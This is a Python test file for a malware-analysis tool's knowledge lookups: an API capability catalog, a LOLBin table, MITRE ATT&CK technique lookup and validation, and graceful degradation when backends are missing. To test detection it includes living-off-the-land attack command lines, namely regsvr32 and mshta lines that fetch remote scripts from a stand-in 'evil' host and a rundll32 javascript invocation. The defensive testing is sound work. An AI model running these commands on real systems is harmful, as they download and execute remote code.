"""``maljan.tools.knowledge`` answers from the vendored tables, or says why not.

The two lookups backed by a vendored JSON file — the API-behaviour catalog and
the LOLBin table — are checked against real values. The three backed by an
index that needs the MITRE bundle or an embedding model are checked for the
contract that matters more than any value: a backend that is not there yields
an empty result and a ``reason``, and never an exception. That is what stops a
missing model turning "we could not look" into "we looked and found nothing".
"""

from __future__ import annotations

from typing import Any

import pytest

from maljan.tools import knowledge


class TestApiCapability:
    def test_a_catalogued_api_reports_its_behaviour_category(self) -> None:
        result = knowledge.api_capability(["WriteProcessMemory", "CreateRemoteThread"])

        by_api = {row["api"]: row for row in result["capabilities"]}
        assert by_api["WriteProcessMemory"]["category"] == "process_injection"
        assert by_api["WriteProcessMemory"]["catalog_flags"] == ["suspicious"]
        assert by_api["CreateRemoteThread"]["behaviours"] == ["process_injection"]

    def test_an_api_the_catalog_does_not_know_comes_back_empty_not_guessed_at(self) -> None:
        result = knowledge.api_capability(["ZzNotARealWin32Api"])
        row = result["capabilities"][0]
        assert row["category"] is None
        assert row["behaviours"] == []
        assert row["techniques"] == []
        assert row["catalog_flags"] == []

    def test_the_catalog_label_names_its_source_rather_than_reading_as_a_verdict(self) -> None:
        """A bare ``suspicious: true`` would be this tool passing judgement.
        ``catalog_flags`` says whose judgement it is."""
        row = knowledge.api_capability(["WriteProcessMemory"])["capabilities"][0]
        assert "suspicious" not in row
        assert row["catalog_flags"] == ["suspicious"]

    def test_a_missing_catalog_is_named_rather_than_silently_empty(self) -> None:
        result = knowledge.api_capability(["WriteProcessMemory"], behaviour_map="data/nope.json")
        assert "not readable" in result["reason"]

    def test_an_empty_list_is_an_empty_answer(self) -> None:
        assert knowledge.api_capability([]) == {"capabilities": []}


class TestLolbinLookup:
    def test_a_scriptlet_rundll32_invocation_maps_to_its_technique(self) -> None:
        result = knowledge.lolbin_lookup(
            ['rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)']
        )

        assert result["hits"] == [
            {
                "binary": "rundll32",
                "technique_id": "T1218.011",
                "pattern": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)',
            }
        ]

    def test_squiblydoo_regsvr32_maps_to_its_own_technique(self) -> None:
        result = knowledge.lolbin_lookup(["regsvr32 /s /u /i:http://evil/x.sct scrobj.dll"])
        assert result["hits"][0]["technique_id"] == "T1218.010"

    def test_the_benign_use_of_a_lolbin_is_not_a_hit(self) -> None:
        """Presence is not evidence: these binaries run on every Windows box
        every minute, and a table that flagged them all would flag nothing."""
        result = knowledge.lolbin_lookup(
            ["regsvr32 /s C:\\Windows\\System32\\legit.dll", "notepad.exe report.txt"]
        )
        assert result == {"hits": [], "checked": 2}

    def test_a_hit_carries_no_confidence_number(self) -> None:
        hit = knowledge.lolbin_lookup(["mshta http://evil/x.hta"])["hits"][0]
        assert set(hit) == {"binary", "technique_id", "pattern"}


class TestAttckLookup:
    def test_a_real_technique_is_valid_and_carries_its_domain_and_platforms(self) -> None:
        result = knowledge.attck_lookup("T1055")
        assert result["valid"] is True
        assert result["domain"] == "enterprise"
        assert result["technique_id"] == "T1055"
        assert result["url"].startswith("https://attack.mitre.org/techniques/T1055")

    def test_an_invented_technique_is_reported_invalid_rather_than_missing(self) -> None:
        result = knowledge.attck_lookup("T9999.001")
        assert result["valid"] is False
        assert result["technique_id"] == "T9999.001"

    def test_an_empty_id_says_what_was_wrong_with_the_call(self) -> None:
        result = knowledge.attck_lookup("")
        assert result["valid"] is False
        assert result["reason"] == "no technique id given"

    def test_a_lowercase_id_is_normalised_before_the_lookup(self) -> None:
        assert knowledge.attck_lookup("t1055")["technique_id"] == "T1055"


class TestAttckValidate:
    def test_only_the_invalid_ids_come_back(self) -> None:
        result = knowledge.attck_validate(["T1055", "T9999.001", "T1547.001"])
        assert [row["id"] for row in result["invalid"]] == ["T9999.001"]
        assert result["checked"] == 3

    def test_a_bogus_subtechnique_of_a_real_parent_suggests_the_parent(self) -> None:
        result = knowledge.attck_validate(["T1055.999"])
        row = result["invalid"][0]
        assert row["id"] == "T1055.999"
        # The suggestion needs the index; when it is unavailable the row says
        # so instead, and either answer is honest.
        assert "T1055" in row["suggestions"] or row.get("reason")

    def test_nothing_invalid_is_an_empty_list(self) -> None:
        assert knowledge.attck_validate(["T1055"])["invalid"] == []

    def test_an_empty_input_is_an_empty_answer(self) -> None:
        assert knowledge.attck_validate([]) == {"invalid": [], "checked": 0}


class TestDegradation:
    """A backend that is not there must never raise and never look like a miss."""

    @pytest.fixture(autouse=True)
    def _reset(self):
        knowledge.reset_indices()
        yield
        knowledge.reset_indices()

    def test_a_missing_family_catalog_answers_with_a_reason(self) -> None:
        result = knowledge.family_lookup("ransomware", catalog="data/no-such-catalog.json")
        assert result["families"] == []
        assert "no family fingerprint catalog" in result["reason"]

    def test_a_missing_case_corpus_answers_with_a_reason(self) -> None:
        result = knowledge.similar_cases("beaconing", corpus="data/no-such-corpus.json")
        assert result["cases"] == []
        assert result["techniques"] == []
        assert "no ATT&CK case corpus" in result["reason"]

    def test_an_embedding_backend_that_raises_becomes_a_reason(self, monkeypatch) -> None:
        def _explode(*args: Any, **kwargs: Any) -> Any:
            raise RuntimeError("no model on this box")

        monkeypatch.setattr("maljan.memory.family_fingerprint_index.load_family_index", _explode)
        result = knowledge.family_lookup("ransomware")
        assert result["families"] == []
        assert "could not be read" in result["reason"]

    def test_an_unreachable_attck_index_leaves_resolve_technique_empty_with_a_reason(
        self, monkeypatch
    ) -> None:
        monkeypatch.setattr(knowledge, "_HYBRID_FAILED", "the ATT&CK index is unavailable: offline")
        result = knowledge.resolve_technique("process injection")
        assert result["candidates"] == []
        assert "unavailable" in result["reason"]

    def test_the_index_failure_is_remembered_rather_than_retried_per_call(
        self, monkeypatch
    ) -> None:
        """A box that cannot reach MITRE would otherwise re-attempt a
        fifty-megabyte download on every single lookup."""
        attempts: list[int] = []

        class _Broken:
            @classmethod
            def from_loader(cls) -> Any:
                attempts.append(1)
                raise RuntimeError("offline")

        monkeypatch.setattr("maljan.memory.hybrid_attck_index.HybridATTCKIndex", _Broken)

        for _ in range(3):
            knowledge.resolve_technique("process injection")

        assert len(attempts) == 1

    def test_a_qdrant_free_box_reports_the_missing_client_rather_than_no_matches(
        self, monkeypatch
    ) -> None:
        from maljan.memory.function_hash_store import FunctionHashStoreUnavailableError

        def _explode(**kwargs: Any) -> Any:
            raise FunctionHashStoreUnavailableError("qdrant-client is required")

        monkeypatch.setattr("maljan.memory.function_hash_store.FunctionHashStore", _explode)
        result = knowledge.function_matches(["deadbeef"], qdrant_url="http://localhost:6333")
        assert result["matches"] == []
        assert "qdrant-client" in result["reason"]

    def test_no_hashes_to_look_up_is_an_empty_answer_without_touching_qdrant(self) -> None:
        assert knowledge.function_matches([], qdrant_url="http://unreachable:6333") == {
            "matches": []
        }
